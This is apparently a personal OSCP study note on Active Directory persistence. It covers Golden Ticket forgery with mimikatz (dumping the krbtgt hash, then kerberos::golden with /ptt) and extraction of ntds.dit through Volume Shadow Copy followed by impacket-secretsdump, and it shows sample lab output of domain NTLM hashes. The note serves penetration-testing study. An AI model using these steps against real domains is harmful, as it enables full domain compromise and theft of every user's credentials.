---
aliases:
  - Active Directory Persistence
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - Persistence
author: Mehdi N Tehrani
creat_date: 2024-01-08
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Golden Ticket
#golden_ticket 
Forge a ticket for any domain user to obtain `Domain Admins` and `Enterprise Admins` rights.

If we are able to get our hands on the _krbtgt_ password hash, we could create our own self-made custom TGTs, also known as _golden tickets_. Golden Tickets give us permission to access the _entire_ domain's resources. 

This provides a neat way of keeping persistence in an Active Directory environment, but the best advantage is that the _krbtgt_ account **password is not automatically changed**. In fact, this password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version. Because of this, it is not uncommon to find very old _krbtgt_ password hashes.

## Requirement
- Domain admin access: to get the krbtgt ntlm from domain controller
- local admin access: to a device to run mimikatz to forge the golden ticket
## Process
1. With a user with admin access to the domain controller e.g. user in *Domain Admins* group, access the domain controller and obtain NTLM hash of `krbtgt` account:
On Domain Controller
#lsadump #lsadump_lsa
```mimikatz
lsadump::lsa /patch
```

2. With the user we want to elevate privileges for move to a device we have local admin access to and generate a golden ticket for **any user** even unprivileged users.
This step is actually performing a sort of **overpass the hash** #overpass_the_hash given we're converting krbtgt NTLM hash into a kerberos ticket.

#kerberos #kerberos_golden #sid #krbtgt #kerberos_purge #purge
```mimikatz
kerberos::purge

kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /krbtgt:<ktbtgt_ntlm_hash> /ptt

misc::cmd
```
3. previous step gives us a `cmd` session which has the following tickets:
```
#0>     Client: jen @ corp.com
        Server: krbtgt/corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 1/7/2024 23:42:06 (local)
        End Time:   1/4/2034 23:42:06 (local)
        Renew Time: 1/4/2034 23:42:06 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
4. we can now use PsExec to access domain controller. Make sure to use the domain name and not the IP address. With domain name authentication is handled by Kerberos, but with IP address the authentication would be using NTLM hash.

# Shadow Copy
#shadowcopy #shadow_copy #vss #volume_shadow_service #ntds_dit #ntds
[vshadow - Microsoft article](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample)

> Note that DCSync is a less conspicuous technique. Shadow Copy leaves much larger track behind.

Also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. `vshadow.exe` is part of Windows SDK. 

Once we've obtained a copy of `ntds.dit` database, we can extract every user credential offline on our local Kali machine.

## Requirement 
Domain Admin: to run shadow copy against the domain controller

## Process
**Use CMD. THIS DIDN'T WORK WITH POWERSHELL.**
1. Get a copy of the whole volume into a folder
```cmd
vshadow.exe -nw -p <destination_folder>
```
Example
```cmd
vshadow.exe -nw -p C:\temp
```

2. Copy `ntds.dit` file out
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2 <destination_path>
```
Example
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\temp\ntds.dit.bak
```

3. Get a copy of registry hive `HKLM\System`
```cmd
reg.exe save HKLM\System <destination_path>
```
example:
```cmd
reg.exe save HKLM\System c:\temp\system.bak
```

4. transfer file to Kali and use *impacket-secretsdump* to get NTLM hash of all domain users:
```sh
impacket-secretsdump -ntds <ntds.dit> -system <system_registry> LOCAL
```

OUTPUT:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
[...]
```